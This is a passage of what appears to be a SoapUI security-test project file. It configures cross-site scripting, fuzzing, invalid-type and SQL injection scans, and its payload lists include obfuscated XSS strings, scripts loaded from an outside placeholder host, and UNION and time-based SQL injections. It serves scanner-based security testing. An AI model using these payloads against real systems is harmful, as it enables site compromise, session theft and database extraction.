SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="Sensitive Information Exposure" id="8b2ea9ab-c033-4a49-bf93-2a99b8a9117a" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="CrosSiteScript" id="e7994365-a4b8-446e-8395-09de3c6e714d" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="c9331a9e-f7cd-4bf0-ad07-9843e1370eed" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:minimal>5</con:minimal><con:maximal>15</con:maximal><con:numberOfRequest>100</con:numberOfRequest></con:config><con:assertion type="Sensitive Information Exposure" id="e27e4f4e-ae6b-4012-92c9-b0c60eeebe08" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ALL_AT_ONCE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="ee477f3e-0b24-4649-83f9-66e9e23d46aa" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:typesList><con:type>3</con:type><con:value>true</con:value></con:typesList><con:typesList><con:type>4</con:type><con:value>GpM7</con:value></con:typesList><con:typesList><con:type>5</con:type><con:value>0FB7</con:value></con:typesList><con:typesList><con:type>9</con:type><con:value>-1E4f</con:value></con:typesList><con:typesList><con:type>10</con:type><con:value>12.45E+12</con:value></con:typesList><con:typesList><con:type>11</con:type><con:value>-1.23</con:value></con:typesList><con:typesList><con:type>12</con:type><con:value>SoapUI is	 the&#13; best
</con:value></con:typesList><con:typesList><con:type>13</con:type><con:value>P1Y2M3DT10H30M12.3S</con:value></con:typesList><con:typesList><con:type>14</con:type><con:value>1999-05-31T13:20:00.000-05:00</con:value></con:typesList><con:typesList><con:type>16</con:type><con:value>1999-05-31</con:value></con:typesList><con:typesList><con:type>22</con:type><con:value>-1267896799</con:value></con:typesList><con:typesList><con:type>23</con:type><con:value>-882223334991111111</con:value></con:typesList><con:typesList><con:type>24</con:type><con:value>-2147483647</con:value></con:typesList><con:typesList><con:type>25</con:type><con:value>-32768</con:value></con:typesList><con:typesList><con:type>26</con:type><con:value>127</con:value></con:typesList><con:typesList><con:type>27</con:type><con:value>0</con:value></con:typesList><con:typesList><con:type>28</con:type><con:value>-1</con:value></con:typesList><con:typesList><con:type>29</con:type><con:value>1</con:value></con:typesList><con:typesList><con:type>30</con:type><con:value>1267896799</con:value></con:typesList><con:typesList><con:type>31</con:type><con:value>882223334991111111</con:value></con:typesList><con:typesList><con:type>32</con:type><con:value>294967295</con:value></con:typesList><con:typesList><con:type>33</con:type><con:value>65535</con:value></con:typesList><con:typesList><con:type>34</con:type><con:value>255</con:value></con:typesList><con:typesList><con:type>35</con:type><con:value>SoapUI is the best</con:value></con:typesList><con:typesList><con:type>36</con:type><con:value>SoapUI is the best</con:value></con:typesList></con:config><con:assertion type="Sensitive Information Exposure" id="fbf483e4-086f-44ab-bbe9-ee0c7af6ea97" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="5cb9b974-6e15-4001-9149-d041a94454fb" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:sqlInjectionStrings>'-'</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,2,1))='i'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 4-- </con:sqlInjectionStrings><con:sqlInjectionStrings>benchmark(50000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or ''&amp;'</con:sqlInjectionStrings><con:sqlInjectionStrings>'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings><con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 20 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>waitfor delay '00:00:05'#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin"or 1=1 or ""="</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or ("1"="1"/*</con:sqlInjectionStrings><con:sqlInjectionStrings>"</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or '1'='1'#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=0-- </con:sqlInjectionStrings><con:sqlInjectionStrings>#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings><con:sqlInjectionStrings>%</con:sqlInjectionStrings><con:sqlInjectionStrings>'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--</con:sqlInjectionStrings><con:sqlInjectionStrings>+benchmark(3200,SHA1(1))+'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</con:sqlInjectionStrings><con:sqlInjectionStrings>+</con:sqlInjectionStrings><con:sqlInjectionStrings>,</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 21 </con:sqlInjectionStrings><con:sqlInjectionStrings>/</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 13# </con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,3,1))='S'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 22-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings><con:sqlInjectionStrings>;</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings><con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 22 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 24# </con:sqlInjectionStrings><con:sqlInjectionStrings>")) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings><con:sqlInjectionStrings>\</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>`</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#</con:sqlInjectionStrings><con:sqlInjectionStrings>));waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 10-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 23 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or sleep(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3</con:sqlInjectionStrings><con:sqlInjectionStrings>" or ""^"</con:sqlInjectionStrings><con:sqlInjectionStrings>" or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2</con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 1,2--+</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings><con:sqlInjectionStrings>-- or #</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin'/*</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or '1'='1'#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 11# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or ("1"="1"--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>&amp;&amp;SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))</con:sqlInjectionStrings><con:sqlInjectionStrings>' or '' '</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 6-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 19-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 22# </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=y-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8</con:sqlInjectionStrings><con:sqlInjectionStrings>IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--</con:sqlInjectionStrings><con:sqlInjectionStrings>")) or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>%00</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#</con:sqlInjectionStrings><con:sqlInjectionStrings>pg_SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7506=9091 AND ('5913=5913</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 20-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND false</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4#</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings><con:sqlInjectionStrings>sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>pg_SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#</con:sqlInjectionStrings><con:sqlInjectionStrings>%2c(select%20*%20from%20(select(sleep(10)))a)</con:sqlInjectionStrings><con:sqlInjectionStrings>' OR '' = '</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION 